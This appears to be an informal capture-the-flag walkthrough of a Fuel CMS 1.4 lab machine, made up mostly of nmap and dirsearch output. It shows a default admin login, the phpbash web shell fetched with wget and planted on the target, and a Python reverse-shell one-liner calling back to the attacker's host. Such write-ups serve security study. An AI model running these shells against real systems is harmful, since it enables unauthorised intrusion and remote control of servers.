```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.211.172           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 18:25 EDT
Nmap scan report for 10.10.211.172
Host is up (0.24s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds

┌──(kali㉿kali)-[~]
└─$ nmap --script=vuln -sC 10.10.211.172 -p80                                                                                                                        1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 18:27 EDT
Verbosity Increased to 1.
Verbosity Increased to 2.
NSE Timing: About 97.37% done; ETC: 18:34 (0:00:11 remaining)
NSE Timing: About 97.37% done; ETC: 18:35 (0:00:12 remaining)
NSE Timing: About 97.37% done; ETC: 18:35 (0:00:13 remaining)
Completed NSE at 18:35, 488.26s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 8.34s elapsed
Nmap scan report for 10.10.211.172
Host is up (0.16s latency).
Scanned at 2021-05-24 18:27:37 EDT for 497s

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /0/: Potentially interesting folder
|   /home/: Potentially interesting folder
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:35
Completed NSE at 18:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 509.61 seconds
```

dirsearch took me to login directory and sadly and most disapointedly admin:admin

so I'm in, 

Fuel CMS
Version 1.4

CVE 2018-16763 RCE

Apache/2.4.18 (Ubuntu) Server at 10.10.211.172 Port 80

/var/www/html/fuel/application/views/home.php 


loged in played around and looks like they have a script checking for scripts, probably could have made it work since it was giving the errors, but too much programing


went to first write up, phpbash a command line in your browser, well that sounds cool, 


https://github.com/Arrexel/phpbash/blob/master/phpbash.php

fired up my python server and served it, 

now we get a webpage!


wget http://10.6.65.43/phpbash.php 

http://10.10.211.172/phpbash.php 

We need a real shell

we inject this command into the webpage and we get a real shell on port 7777

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURIPADDRESS",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
stabilize that shell 

`python -c 'import pty; pty.spawn("/bin/bash")'`

control + Z

stty raw -echo;fg


so he says the flag is in where the app would store it, found it, 

`www-data@ubuntu:/var/www/html/fuel/data_backup$ cat index.html`

this was a trip, messages through dirsearch

```bash
┌──(kali㉿kali)-[~/dirsearch]
└─$ python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.211.172 
/home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.4) or chardet (4.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Error Log: /home/kali/dirsearch/logs/errors-21-05-24_18-28-05.log

Target: http://10.10.211.172/

Output File: /home/kali/dirsearch/reports/10.10.211.172/_21-05-24_18-28-06.txt

[18:28:06] Starting: 
[18:28:09] 200 -   16KB - /index
[18:28:13] 200 -   16KB - /0
[18:28:17] 301 -  315B  - /assets  ->  http://10.10.211.172/assets/
[18:28:26] 200 -   16KB - /home
[18:28:59] 400 -    1KB - /'
[18:29:48] 400 -    1KB - /$FILE
[18:29:53] 400 -    1KB - /$file
[18:29:59] 200 -   70B  - /offline
[18:30:01] 400 -    1KB - /*checkout*
[18:32:50] 400 -    1KB - /*docroot*
[18:33:34] 400 -    1KB - /*
[18:34:02] 400 -    1KB - /$File
[18:35:04] 400 -    1KB - /!ut
[18:36:52] 400 -    1KB - /search!default
[18:36:56] 400 -    1KB - /msgReader$1
[18:40:05] 400 -    1KB - /login!withRedirect
[18:40:07] 400 -    1KB - /guestsettings!default
[18:42:03] 400 -    1KB - /$1
[18:43:26] 301 -  313B  - /fuel  ->  http://10.10.211.172/fuel/
[18:46:03] 400 -    1KB - /front_page!PAGETYPE
[18:47:17] 400 -    1KB - /Oasis%20-%20'Definitely%20Maybe'
[18:49:16] 400 -    1KB - /**http%3a
[18:51:18] 400 -    1KB - /searchProfile!input
[18:51:32] 400 -    1KB - /Who's-Connecting
[18:52:08] 400 -    1KB - /*http%3A
[18:52:56] 400 -    1KB - /$VisitURL
[18:53:07] 400 -    1KB - /escalate!PAGETYPE
[18:54:17] 400 -    1KB - /post!default
[18:58:44] 400 -    1KB - /$e1_gif
[18:59:13] 400 -    1KB - /!
[18:59:26] 400 -    1KB - /post!reply
[18:59:31] 400 -    1KB - /msgReader$0
[19:02:02] 400 -    1KB - /!dl
[19:02:34] 400 -    1KB - /$Body
[19:04:00] 400 -    1KB - /Yak!v_2
[19:05:19] 400 -    1KB - /**http%3A
[19:06:14] 400 -    1KB - /H!dden_7
[19:06:14] 400 -    1KB - /yahoo!
[19:15:49] 400 -    1KB - /Check%20Screenshots!
[19:15:50] 400 -    1KB - /Check%20All%20Tracker%20Features!
[19:18:19] 400 -    1KB - /Bling!
[19:22:43] 400 -    1KB - /watch!me
[19:22:56] 400 -    1KB - /$searchForm
[19:24:17] 400 -    1KB - /$
[19:24:46] 400 -    1KB - /$2
[19:25:01] 400 -    1KB - /msgReader$111
[19:25:18] 400 -    1KB - /storyReader$11
[19:25:19] 400 -    1KB - /storyReader$12
[19:25:19] 400 -    1KB - /msgReader$14
[19:25:20] 400 -    1KB - /msgReader$211
[19:25:24] 400 -    1KB - /storyReader$151
[19:25:51] 400 -    1KB - /Welcome!
[19:26:48] 400 -    1KB - /$2006
[19:29:00] 400 -    1KB - /account!default
[19:32:32] 400 -    1KB - /$1963
[19:32:32] 400 -    1KB - /msgReader$14528
[19:32:32] 400 -    1KB - /msgReader$14529
[19:32:38] 400 -    1KB - /comments$trackback
[19:33:43] 403 -  301B  - /server-status
[19:34:13] 400 -    1KB - /msgReader$65
[19:34:50] 400 -    1KB - /msgReader$214
[19:35:41] 400 -    1KB - /cns!FB3017FBB9B2E142!285
[19:35:42] 400 -    1KB - /msgReader$42
[19:35:42] 400 -    1KB - /msgReader$20
[19:35:42] 400 -    1KB - /msgReader$19
[19:36:20] 400 -    1KB - /storyReader$14
[19:36:20] 400 -    1KB - /msgReader$11
[19:37:43] 400 -    1KB - /b00g!
[19:39:42] 400 -    1KB - /party!
[19:41:42] 400 -    1KB - /leeches!
[19:42:10] 400 -    1KB - /!sathack
[19:43:41] 400 -    1KB - /login!default
[19:44:37] 400 -    1KB - /devinmoore*
[19:47:42] 400 -    1KB - /cns!C29701F38A601141!1307
[19:50:16] 400 -    1KB - /E!%20Stern%20Show%20-%20Stuck%20On%20You%20w
[19:50:41] 400 -    1KB - /gab!%20-%20Arschwacklers%20Stampfgesetz
[19:50:43] 400 -    1KB - /gab!%20-%20timecode
[19:50:43] 400 -    1KB - /gab!%20-%20fluffy%20tunes
[19:50:46] 400 -    1KB - /G4TECHTV-dark%20tips!%20Free%20console%20or%20handheld
[19:52:15] 400 -    1KB - /M$%20Office12%20Pro
[19:52:25] 400 -    1KB - /M$%20Office%202003%20Pro
[19:52:29] 400 -    1KB - /Mac%20Fishin!!!
[19:53:11] 400 -    1KB - /I!%20My!%20Me!%20Strawberry%20Eggs!%20OST
[19:53:15] 400 -    1KB - /i%20deep%20throat%20in%20a%20thong!
[19:53:33] 400 -    1KB - /Yahoo!Messenger
[19:53:33] 400 -    1KB - /Yahoo!Messenger%20scr
[19:54:10] 400 -    1KB - /Hacker's%20Delight
[19:54:10] 400 -    1KB - /Handyman's%20Handbook
[19:54:19] 400 -    1KB - /Ka$a
[19:54:20] 400 -    1KB - /Sam's%20Teach%20Yourself%20Adobe%20Photoshop%20CS2%20in%2024
[20:00:56] 400 -    1KB - /new!
[20:02:45] 400 -    1KB - /Qix!_0
[20:03:26] 400 -    1KB - /Yourself!Fitness
[20:05:00] 400 -    1KB - /cns!BD2F265F7D4E3BA4!257
CTRL+C detected: Pausing threads, please wait...
[e]xit / [c]ontinue: c
[20:09:44] 400 -    1KB - /U$O%20JegVilGerneDuVilGerneViSkalGerne
[20:09:45] 400 -    1KB - /U$O%20-%20Jegvilgerneduvilgerneviskalgerne
[20:11:17] 400 -    1KB - /Naked%20Gymnastics%20-%20This%20Is%20How%20It%20Should%20Always%20Be!
[20:12:00] 400 -    1KB - /nada!
[20:13:00] 400 -    1KB - /Q%20Are%20We%20Not%20Men%20A%20We%20Are%20Devo!
[20:13:40] 400 -    1KB - /Y!Spy
[20:13:46] 400 -    1KB - /Yahoo!%20Anti-Spy%20v1
[20:13:46] 400 -    1KB - /Yahoo!%20to%20the%20Max%20%20An%20Extreme%20Searcher%20Guide
[20:14:21] 400 -    1KB - /FAQ's
[20:14:41] 400 -    1KB - /avast!antivirus
[20:20:07] 400 -    1KB - /e-mail%20me!2
[20:20:11] 400 -    1KB - /wsolcq$
[20:20:21] 400 -    1KB - /!index!
[20:21:16] 400 -    1KB - /35-GeoCool!
[20:23:15] 400 -    1KB - /storyReader$86
[20:24:26] 400 -    1KB - /RA_Bust'em
[20:27:45] 400 -    1KB - /picture$11
[20:30:06] 400 -    1KB - /Cabela's%20African%20Safari100%20Mb
[20:30:07] 400 -    1KB - /Cabela's%20African%20Safari
[20:32:18] 400 -    1KB - /200109*
[20:34:01] 400 -    1KB - /*sa_
[20:34:01] 400 -    1KB - /*dc_
[20:34:24] 400 -    1KB - /$$X-00
[20:36:18] 400 -    1KB - /graphic_text!0
[20:37:02] 400 -    1KB - /widtpubl$
[20:37:37] 400 -    1KB - /msgReader$27006
[20:37:37] 400 -    1KB - /msgReader$31036
[20:37:37] 400 -    1KB - /msgReader$1621
[20:37:37] 400 -    1KB - /msgReader$30456
[20:37:37] 400 -    1KB - /msgReader$1622
[20:37:37] 400 -    1KB - /msgReader$28
[20:37:38] 400 -    1KB - /msgReader$24927
[20:37:39] 400 -    1KB - /storyReader$65
[20:37:41] 400 -    1KB - /storyReader$7016
[20:37:45] 400 -    1KB - /storyReader$37242
[20:37:45] 400 -    1KB - /msgReader$31110
[20:37:45] 400 -    1KB - /reader$37242
[20:37:45] 400 -    1KB - /msgReader$37218
[20:37:45] 400 -    1KB - /storyReader$31603
[20:37:46] 400 -    1KB - /msgReader$22062
[20:37:46] 400 -    1KB - /msgReader$7103
[20:37:46] 400 -    1KB - /storyReader$10033
[20:37:47] 400 -    1KB - /msgReader$822
[20:37:48] 400 -    1KB - /viewDepartment$Frontier%20and%20Manila
[20:37:48] 400 -    1KB - /msgReader$7383
[20:37:48] 400 -    1KB - /storyReader$1047
[20:37:48] 400 -    1KB - /msgReader$30423
[20:37:48] 400 -    1KB - /msgReader$230
[20:37:48] 400 -    1KB - /msgReader$166
[20:37:48] 400 -    1KB - /msgReader$30368
[20:37:48] 400 -    1KB - /msgReader$169
[20:37:48] 400 -    1KB - /msgReader$30164
[20:37:48] 400 -    1KB - /viewer$29287
[20:37:48] 400 -    1KB - /msgReader$30169
[20:37:48] 400 -    1KB - /msgReader$14400
[20:37:48] 400 -    1KB - /msgReader$30304
[20:37:49] 400 -    1KB - /msgReader$30324
[20:37:49] 400 -    1KB - /msgReader$30752
[20:37:49] 400 -    1KB - /storyReader$12816
[20:37:49] 400 -    1KB - /msgReader$7045
[20:39:35] 400 -    1KB - /Godwin's_law
[20:39:41] 400 -    1KB - /msgReader$51
[20:40:04] 400 -    1KB - /storyReader$15
[20:40:05] 400 -    1KB - /msgReader$29290
[20:40:06] 400 -    1KB - /viewDepartment$Radio%20UserLand
[20:40:09] 400 -    1KB - /msgReader$29
[20:40:15] 400 -    1KB - /cns!1p1jUqsfPsDJ0sEPuZ997-OA!217
[20:40:16] 400 -    1KB - /storyReader$1744
[20:40:16] 400 -    1KB - /reader$5
[20:40:17] 400 -    1KB - /msgReader$2691
[20:40:17] 400 -    1KB - /storyReader$166
[20:40:17] 400 -    1KB - /msgReader$110
[20:40:17] 400 -    1KB - /storyReader$16
[20:40:17] 400 -    1KB - /msgReader$12
[20:41:48] 400 -    1KB - /view_results!PAGETYPE
[20:41:48] 400 -    1KB - /view_question!PAGETYPE
[20:43:02] 400 -    1KB - /NaMo!_v4
[20:43:05] 400 -    1KB - /I%20Don't%20Need%20A%20Man
[20:43:05] 400 -    1KB - /Call%20Me%20When%20You're%20Sober
[20:43:06] 400 -    1KB - /I%20Don't%20Feel%20Like%20Dancing
[20:43:06] 400 -    1KB - /That's%20That
[20:43:06] 400 -    1KB - /Let's%20Ride
[20:43:08] 400 -    1KB - /Everything's%20Just%20Wonderful
[20:45:34] 400 -    1KB - /cns!8560B877FE8E9138!312
[20:46:43] 400 -    1KB - /Go!
[20:48:19] 400 -    1KB - /$100-olpc
[20:50:12] 400 -    1KB - /$$$
[20:50:13] 400 -    1KB - /r0!t
[20:50:17] 400 -    1KB - /!community
[20:50:17] 400 -    1KB - /!favs
[20:50:17] 400 -    1KB - /!help

Task Completed
```         